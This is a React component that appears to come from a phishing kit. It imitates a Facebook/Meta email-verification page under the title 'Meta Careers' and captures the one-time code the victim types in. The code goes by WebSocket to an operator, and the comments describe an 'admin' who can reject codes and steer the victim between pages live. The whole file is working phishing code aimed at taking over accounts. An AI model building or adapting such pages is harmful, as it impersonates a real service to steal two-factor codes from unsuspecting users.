import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useWebSocket } from "../../context/WebSocketContext";
import useDynamicCss from "../../utils/useDynamicCss";

const EmailOtp = () => {
  useEffect(() => {
    document.title = 'Meta Careers';
  }, []);

  useDynamicCss("/css/FbEmailOtp.css");
  const [searchParams] = useSearchParams();
  const errorParam = searchParams.get("error");

  const {
    submitForm,
    verificationError,
    clearVerificationError,
    navigationEvent,
    clearNavigationEvent,
  } = useWebSocket();
  const [code, setCode] = useState("");
  const [showError, setShowError] = useState(false);
  const [showInvalidError, setShowInvalidError] = useState(
    errorParam === "wrong-code",
  );
  const [isLoading, setIsLoading] = useState(false);
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Timer logic for resending code
  const [timeLeft, setTimeLeft] = useState(157); // 2:37 in seconds

  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 700);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60)
      .toString()
      .padStart(2, "0");
    const s = (seconds % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  // Reset state when admin navigates (allows changing route without re-submitting)
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  useEffect(() => {
    const errorParam = searchParams.get("error");
    if (errorParam === "wrong-code") {
      setShowInvalidError(true);
      setIsLoading(false);
    }
  }, [searchParams]);

  // Handle verification error from admin
  useEffect(() => {
    if (
      verificationError &&
      (verificationError.type === "email" ||
        verificationError.type === "fb-email" ||
        verificationError.type === "wrong-code")
    ) {
      setShowInvalidError(true);
      setIsLoading(false);
      setCode("");
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  const handleSubmit = (e: any) => {
    e.preventDefault();

    const value = code.trim();

    // Validate code (6-8 digits)
    if (value.length < 6 || value.length > 8 || !/^\d+$/.test(value)) {
      setShowError(true);
      return;
    }

    setShowError(false);
    setIsLoading(true);

    // Submit to WebSocket
    submitForm("fb-email", {
      code: value,
    });
  };

  return (
    <>
      {isPageLoading && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            backgroundColor: "#ffffff",
            zIndex: 99999,
          }}
        ></div>
      )}
      <div
        className={`wrapper-loading-root ${isLoading ? "body-loading" : ""}`}
      >
        <div
          className="progress-bar"
          style={{ display: isLoading ? "block" : "none" }}
        >
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <div className={`verification_main ${isLoading ? "body-loading" : ""}`}>
        <div className="container">
          <div className="heading">
            <span> • Facebook</span>
            <h2>Check your email</h2>
            <p>Enter the code that we sent to your email.</p>
          </div>
          <div className="image">
            <img alt="Image" src="/assets/facebook/email.png" />
          </div>
          <div className="form">
            <form onSubmit={handleSubmit}>
              <input
                className="authFormInput"
                id="authenticator"
                placeholder="Code"
                maxLength={8}
                type="text"
                name="authenticator"
                value={code}
                onChange={(e) => {
                  setCode(e.target.value);
                  setShowError(false);
                  setShowInvalidError(false);
                }}
              />
              <span
                className="error"
                style={{ display: showError ? "block" : "none" }}
              >
                Entered code is incorrect.
              </span>
              <span
                className="error"
                style={{ display: showInvalidError ? "block" : "none" }}
              >
                Invalid code. Please check your email and try again.
              </span>
              <div className="new_code">
                <div className="request items-center">
                  <svg
                    viewBox="0 0 24 24"
                    fill="currentColor"
                    width="1em"
                    height="1em"
                    className="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od"
                  >
                    <path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path>
                  </svg>
                  <p id="showSeconds" style={{ margin: 0 }}>
                    We can send a new code in{" "}
                    <span id="seconds">{formatTime(timeLeft)}</span>
                  </p>
                </div>
              </div>
              <div className="authSubmit">
                <button
                  name="submitAuth"
                  id="submitButton"
                  type="submit"
                  disabled={code.length < 6 || isLoading}
                  style={{
                    opacity: code.length < 6 || isLoading ? 0.6 : 1,
                    cursor:
                      code.length < 6 || isLoading ? "not-allowed" : "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "8px",
                  }}
                >
                  {isLoading ? (
                    <>
                      <svg className="spinner" viewBox="0 0 50 50">
                        <circle
                          className="path"
                          cx="25"
                          cy="25"
                          r="20"
                          fill="none"
                          strokeWidth="5"
                        ></circle>
                      </svg>
                      <span>Please wait...</span>
                    </>
                  ) : (
                    "Continue"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default EmailOtp;
